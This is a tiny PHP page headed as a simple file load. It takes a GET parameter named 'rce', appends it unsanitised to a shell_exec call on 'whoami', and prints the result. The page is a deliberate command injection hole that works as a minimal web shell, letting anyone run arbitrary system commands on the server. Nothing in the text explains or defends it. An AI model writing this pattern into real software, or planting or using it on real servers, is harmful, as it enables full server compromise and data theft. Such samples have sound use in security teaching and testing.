<h2>Another simple load of a file</h2>
<?php 
$rce = $_GET['rce'];
echo shell_exec('whoami'.$rce);
?>
